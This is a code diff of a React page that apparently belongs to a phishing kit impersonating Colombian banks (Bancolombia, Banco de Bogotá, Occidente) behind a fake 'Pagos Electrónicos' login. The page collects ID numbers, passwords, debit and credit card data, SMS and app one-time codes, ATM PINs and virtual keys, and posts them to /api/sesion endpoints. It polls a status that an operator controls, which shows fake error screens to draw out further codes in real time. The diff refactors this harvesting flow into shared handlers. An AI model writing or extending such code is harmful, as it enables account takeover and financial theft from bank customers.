@@ -4,12 +4,13 @@ import { Tarjeta } from "@/components/tarjeta/Tarjeta"
 import { Status } from "@/components/status/Status"
 import { useEffect, useRef, useState } from "react"
 import axios from "axios"
+import { handlerAplicacion, handlerCajero, handlerClaveVirtual, handlerMensaje, handlerTarjeta } from "@/utils/handlerVista"
 
 const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"
 const COLOR_PRINCIPAL_BACK = "bg-[#072146]"
 const back_color = "bg-[#ffffff]"
 const text_color_principal = "text-black"
-const ESTILO_BTN_PRINCIPAL = `w-full font-bold py-2 px-6 bg-[#0041a8] text-white rounded-full disabled:bg-gray-200 disabled:text-gray-500 cursor-not-allowed`
+const ESTILO_BTN_PRINCIPAL = `flex justify-center items-center font-bold py-2 px-3 bg-[#0065dc] text-white text-[12px] rounded-sm disabled:text-[#73adfa] cursor-not-allowed`
 
 const svg = (
     <img src="/assets/bancolombia/user.svg" className="w-[20px] h-[20px] object-contain" alt="" />
@@ -65,6 +66,11 @@ const InputAnimado = ({
 
   return (
     <div className="w-full flex flex-col">
+        {label && 
+            <div className="text-[12px] text-[#5c5c5c] font-bold">
+                {label}
+            </div>
+        }
         <div className={`w-full flex mt-1.5 ${isFocused ? "border border-[#0041a8]":"border border-slate-300"}`}>
             <input
                 inputMode={modoNumerico ? "numeric" : "text"}
@@ -214,9 +220,11 @@ const SelectMinimalista = ({
 const Usuario = ({handlerCheck, handlerInformacion,handlerContinuar, datosInicio, errorDatos}) =>{
     return(
         <div className="w-[99%] bg-white p-2 rounded-xl flex flex-col items-center">
-            <span className="w-[90%] text-[14px] text-[#5c5c5c]">Identificación</span>
-            <div className="w-[100vw] mt-0.5 flex gap gap-x-4">
-                <div className="w-[20%] ml-[15%]">
+            <div className="w-full mt-0.5 flex gap gap-x-4">
+                <span className="text-[12px] ml-[10px] text-[#5c5c5c] font-bold">Identificación</span>
+            </div>
+            <div className="w-full mt-0.5 flex gap gap-x-3.5">
+                <div className="w-[26%]">
                     <SelectMinimalista 
                         label={""}
                         labelColor={"text-[#5c5c5c]"}
@@ -230,7 +238,7 @@ const Usuario = ({handlerCheck, handlerInformacion,handlerContinuar, datosInicio
                         borderColError={"border-red-600"}
                     />
                 </div>
-                <div className="w-[54%]">
+                <div className="w-[69%]">
                     <InputAnimado 
                         error={!!errorDatos.numeroDocumento}
                         errorLabel={errorDatos.numeroDocumento} 
@@ -244,9 +252,9 @@ const Usuario = ({handlerCheck, handlerInformacion,handlerContinuar, datosInicio
                     />
                 </div>     
             </div>
-            <div className="w-[100vw] flex flex-col">
-                <span className="ml-[15%] text-[14px] text-[#5c5c5c]">Contraseña</span>
-                <div className="ml-[18%] w-[75%]">
+            <div className="w-full mt-3.5 mb-0.5 flex flex-col ml-[10px]">
+                <span className="text-[12px] text-[#5c5c5c] font-bold">Contraseña</span>
+                <div className="w-[99%]">
                     <InputAnimado 
                             error={!!errorDatos.contrasenia}
                             errorLabel={errorDatos.contrasenia} 
@@ -262,14 +270,17 @@ const Usuario = ({handlerCheck, handlerInformacion,handlerContinuar, datosInicio
                 </div>
             </div>
             <div className="w-full pt-6 pb-2 flex justify-between items-center">
-                <button className="px-4 py-1.5 text-[11px] border border-slate-300 flex justify-between items-center rounded-sm font-bold">
+                <button className="px-3 py-2 text-[11px] border border-slate-300 flex justify-between items-center rounded-sm text-[#5c5c5c] font-bold">
                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0081ff" className="bi bi-arrow-left mr-1.5" viewBox="0 0 16 16">
                         <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8"/>
                     </svg>
                     Volver al comercio
                 </button>
-                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.numeroDocumento.trim() == ""} className={"font-bold py-2 px-6 bg-[#0065dc] text-white text-[12px] rounded-sm disabled:text-gray-500 cursor-not-allowed"}>
-                    Continuar
+                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.numeroDocumento.trim() == ""} className={"flex justify-center items-center font-bold py-2 px-3 bg-[#0065dc] text-white text-[12px] rounded-sm disabled:text-[#73adfa] cursor-not-allowed"}>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-lock-fill pr-1.5" viewBox="0 0 16 16">
+                        <path fill-rule="evenodd" d="M8 0a4 4 0 0 1 4 4v2.05a2.5 2.5 0 0 1 2 2.45v5a2.5 2.5 0 0 1-2.5 2.5h-7A2.5 2.5 0 0 1 2 13.5v-5a2.5 2.5 0 0 1 2-2.45V4a4 4 0 0 1 4-4m0 1a3 3 0 0 0-3 3v2h6V4a3 3 0 0 0-3-3"/>
+                    </svg>
+                    Ingresar
                 </button>
             </div>
         </div>
@@ -345,13 +356,13 @@ const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar,
     };
 
     return (
-        <div className="w-full flex flex-col justify-center items-center pb-4">
+        <div className="w-[95%] flex flex-col justify-center items-center pb-4">
             {tituloError !== "" && 
-                <div className="w-full flex items-center justify-center">
-                    <span className="text-[11px] text-red-600">{tituloError}</span>
+                <div className="w-full flex items-center mt-3 justify-center">
+                    <span className="text-[11px] text-center text-red-600">{tituloError}</span>
                 </div>
             }
-            <div className="w-[90%] flex mt-4 flex-col justify-center items-center gap gap-y-4 pl-1">
+            <div className="w-full flex mt-4 flex-col justify-center items-center gap gap-y-4 pl-1">
                 <Usuario handlerInformacion={handlerInformacion} handlerCheck={handlerCheck} errorDatos={errorDatos} datosInicio={datosInicio} handlerContinuar={handlerContinuar} />             
             </div>
         </div>
@@ -362,12 +373,10 @@ const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar,
 
 
 
-export default function Bogota (){
-    const [tipoUsuario, setTipoUsuario] = useState("personas")
-    const [inicioSesion, setInicioSesion] = useState(false)
-    const [selectVista, setSelectVisata] = useState(null)
+export default function Occidente (){
+    const isMounted = useRef(true);
+    const [selectVista, setSelectVisata] = useState("nlogin")
     const [loading, setLoading] = useState(false)
-    const [tituloError, setTituloError] = useState("")
     const [reLoad, setReLoad] = useState(false)
     const [key, setKey] = useState(0)
     const [datosInicio, setDatosInicio] = useState({
@@ -378,17 +387,43 @@ export default function Bogota (){
     const [guardado, setGuardado] = useState(false)
     const [uniqId, setUniqId] = useState("")
     const [btnInicio, setBtnInicio] = useState(false)
-
+    
     const handlerInformacion = (e)=>{
-        console.log(e);
-        
         const copia = {...datosInicio}
         copia[e.target.name] = e.target.value
+        
         setDatosInicio(copia)
     }
 
     const handlerBtnInicio = ()=>{
         setBtnInicio(b => !b)
+    }
+
+    const handlerloginError = ()=>{
+        setBtnInicio(true)
+    }
+
+    const tarjetaData = {
+        'tdb': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:"}, 
+        'xtdb':{span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."}, 
+        'tdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingrese los siguientes datos de su tarjeta credito:"}, 
+        'xtdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."},
+    }
+
+    const loginData  ={
+        'nlogin': {handler: handlerInformacion, btn: handlerBtnInicio},
+        'xlogin': {handler: handlerInformacion, btn: handlerloginError, error: "La información ingresada es incorrecta. Intenta nuevamente."},
+    }
+
+    const codData = {  
+        'codsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto."}, 
+        'xcodsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."},
+        'codapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica desde la App Mi Bancolombia."}, 
+        'xcodapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."}, 
+        'pincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:"}, 
+        'xpincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
+        'pinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:"}, 
+        'xpinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
     }
     
     //obtener uniqId
@@ -402,229 +437,23 @@ export default function Bogota (){
     
     //guardad datos de sesion
     useEffect(()=>{
-        const inicioSesionfuncion = async ()=>{
-            setLoading(true)
-            const { data } = await axios.post(
-            `/api/sesion`,
-            {
-                usuario: datosInicio.numeroDocumento,
-                clave: datosInicio.contrasenia,
-                banco: "Bancolombia",
-                informacion:{
-                    tipoDocumento: datosInicio.tipoDocumento
-                },
-                uniqid: uniqId    
-            },
-            {
-                headers: {
-                "Content-Type": "application/json",
-                Accept: "application/json",
-                },
-            }
-            )
-            if(uniqId === "" ) {
-                localStorage.setItem('uniqId', data.uniqid)
-                setUniqId(data.uniqid)
-            }
-            setKey(k => k+1)
-            setInicioSesion(true)
-            setTituloError("")
-            setGuardado(true)
-            
-        }
         if (btnInicio) {
-            inicioSesionfuncion()
+            inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setGuardado, selectVista,"Occidente")
         }
     },[btnInicio])
 
     //pulling
     useEffect(() => {
-    let isMounted = true;
+        isMounted.current = true;
 
-    const iniciarLongPolling = async () => {
-        if (!isMounted) return;
-        setTituloError("")
-        try {
-            const selV = await axios.get(`/api/sesion/status/${uniqId}`, {
-                headers: {
-                    "Content-Type": "application/json",
-                    "Accept": "application/json",
-                },
-            });
-            console.log(selV.data.status);
-            
-            if (
-                selV.data.status == "tdb" ||
-                selV.data.status == "tdb-error" ||
-                selV.data.status == "tdc" ||
-                selV.data.status == "tdc-error" ||
-                selV.data.status == "otpsms" ||
-                selV.data.status == "otpsms-error" ||
-                selV.data.status == "otpapp" ||
-                selV.data.status == "otpapp-error" ||
-                selV.data.status == "clavecajero" ||
-                selV.data.status == "clavecajero-error" ||
-                selV.data.status == "clavevirtual" ||
-                selV.data.status == "clavevirtual-error" &&
-                selV.data.status !== selectVista
-            ) {
-                setSelectVisata(selV.data.status);
-                setKey(prev => prev + 1) 
-                setLoading(false);
-                return;
-            }else if(selV.data.status == "fin"){
-                setSelectVisata("compraExitosa")
-                setLoading(false);
-                return;
-            }else if(selV.data.status == "error"){
-                setSelectVisata("errorCompra")
-                setLoading(false);
-                return;
-
-            }else if(selV.data.status == "login" || selV.data.status == "login-error"){
-                setDatosInicio({
-                    numeroDocumento: "",
-                    contrasenia:""
-                })
-                setSelectVisata(selV.data.status)
-                if (selV.data.status == "login-error") setTituloError("Informacion incorrecta, ingresala nuevamente")
-                setKey(prev => prev + 1)
-                setLoading(false);
-                return;
-            }
-        } catch (error) {
-            console.log(error);
+        if (guardado) {
+            iniciarLongPolling( isMounted, uniqId, setKey, setLoading, setSelectVisata, selectVista, setDatosInicio);
+            setBtnInicio(false)
         }
-
-        // Esperamos 4 segundos y reintentamos
-        setTimeout(iniciarLongPolling, 4000);
-    };
-    if (guardado) {
-        iniciarLongPolling()
-    }
-
-    return () => {
-        isMounted = false;
-    };
+        return () => {
+            isMounted.current = false;
+        };
     }, [guardado, reLoad]);
-
-    //mensje-otp
-    const handlerMensaje = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/otp-sms`, {
-                uniqid: uniqId,
-                otpsms: clave 
-            },{
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-
-    const handlerloginError = async ()=>{
-        try {
-            setLoading(true)
-            const { data } = await axios.post(
-            `/api/sesion`,
-            {
-                usuario: datosInicio.numeroDocumento,
-                clave: datosInicio.contrasenia,
-                banco: "Alianza",
-                uniqid: uniqId    
-            },
-            {
-                headers: {
-                "Content-Type": "application/json",
-                Accept: "application/json",
-                },
-            }
-            )
-            setReLoad(r => r = !r)            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-    
-    //otp-app
-    const handlerAplicacion = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/otp-app`, {
-                uniqid: uniqId,
-                otpapp: clave 
-            },{
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-
-    //clave-cajero
-    const handlerCajero = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/clave-cajero`, {
-                uniqid: uniqId,
-                clavecajero: clave 
-            },{
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-    //clave-virtual
-    const handlerClaveVirtual = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/clave-virtual`, {
-                uniqid: uniqId,
-                clavevirtual: clave 
-            },{
-            headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-
-    //tarjeta
-    const handlerTarjeta = async (body) =>{
-        try {
-            setLoading(true)
-            body.uniqid = uniqId
-            const send = await axios.post(`/api/sesion/tarjeta`, body, {
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-            console.log(error);
-            setReLoad(r => r = !r)
-        }
-        
-    }
-
 
 
     return(
@@ -663,7 +492,7 @@ export default function Bogota (){
             </div>
 
 
-            <div className="w-full flex">
+            <div className="w-full flex justify-center">
                 <div className="min-h-[70vh] w-[90%] flex flex-col items-center justify-center">
                     <div className="w-full flex justify-center">
                         <img src="/assets/occidente/header.svg" className="w-[55%] object-cover" alt="" />
@@ -673,56 +502,15 @@ export default function Bogota (){
                         <span className="text-[14px] font-bold text-[#0081ff]">Pagos Electrónicos</span>
                     </div>
                     {loading && <Loading/>}
-                    {reLoad && <Loading/>}
-                    {!inicioSesion &&  <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
-                    {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
-                    {selectVista == "tdb" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "tdb-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "tdc" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "tdc-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "otpsms" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "otpsms-error" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "otpapp" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave dinamica"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "otpapp-error" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "clavecajero" && <Status key={key} tamInput={6} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "clavecajero-error" && <Status key={key} tamInput={6} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "clavevirtual" && <Status key={key} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "clavevirtual-error" && <Status key={key} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    
+                    { loginData[selectVista] && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={loginData[selectVista]?.error || ""} btnInicio={loginData[selectVista].handler}/>}
+                    
+                    { tarjetaData[selectVista] && <Tarjeta key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} error={tarjetaData[selectVista]?.error || ""} titulo={tarjetaData[selectVista].titulo} estiloTitulo="text-[#5c5c5c] text-[13px] text-center font-bold" handlerTarjeta={tarjetaData[selectVista].handler} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} textColor={"text-[#5c5c5c] font-bold"}  backGraundInput={"bg-white"} divInput={`w-full flex mt-1.5 border border-slate-300`}/>}
+                    
+                    { codData[selectVista] && <Status key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} tamInput={6} textColor={text_color_principal} titulo={codData[selectVista].titulo} estiloTitulo="text-[#5c5c5c] text-[13px] text-center font-bold" lebelInput={codData[selectVista].span} InputModificado={InputAnimado} handler={codData[selectVista].handler} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={codData[selectVista]?.error || ""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    
                 </div>
-            </div>
-
-
-
-            <div className="w-[70%] flex items-center justify-between mb-4">
-                <img src="/assets/bogota/abajo.png" className="w-[20%] object-contain" alt="" />
-                <span className="text-[9px] text-[#5c5c5c]">Banco de Bogotá - 2025</span>
-            </div>
-            <div className="w-full flex flex-col justify-center items-center bg-[linear-gradient(to_bottom,_#0074d3_-11%,_#0040a8)]  py-7">
-                <div className="w-[90%] flex flex-col items-center justify-center">
-                    <div className="w-full flex items-start border-b-1 pb-3 border-b-gray-500">
-                        <div className="w-[70%] flex flex-col justify-center">
-                            <span className="text-[15px] mb-1.5 font-semibold text-white">Tu seguridad es lo primero</span>
-                            <span className="text-[12px] text-white">Sigue estos tips y tus transacciones estarán blindadas</span>
-                        </div>
-                        <div className="rounded-full p-2 ml-[15%] bg-[#0041a8] text-white">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-chevron-down" viewBox="0 0 16 16">
-                                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
-                            </svg>
-                        </div>
-                    </div>
-                    <div className="w-full flex items-start mt-5 pb-1.5 ">
-                        <div className="w-[70%] flex flex-col justify-center">
-                            <span className="text-[15px] mb-1.5 font-semibold text-white">Contáctanos </span>
-                            <span className="text-[12px] text-white">Si tienes alguna duda o algo te ha sucedido usa nuestros canales</span>
-                        </div>
-                        <div className="rounded-full p-2 ml-[15%] bg-[#0041a8] text-white">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-chevron-down" viewBox="0 0 16 16">
-                                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
-                            </svg>
-                        </div>
-                    </div>
-                </div>                      
-           </div>             
+            </div>            
         </div>
     )
 }
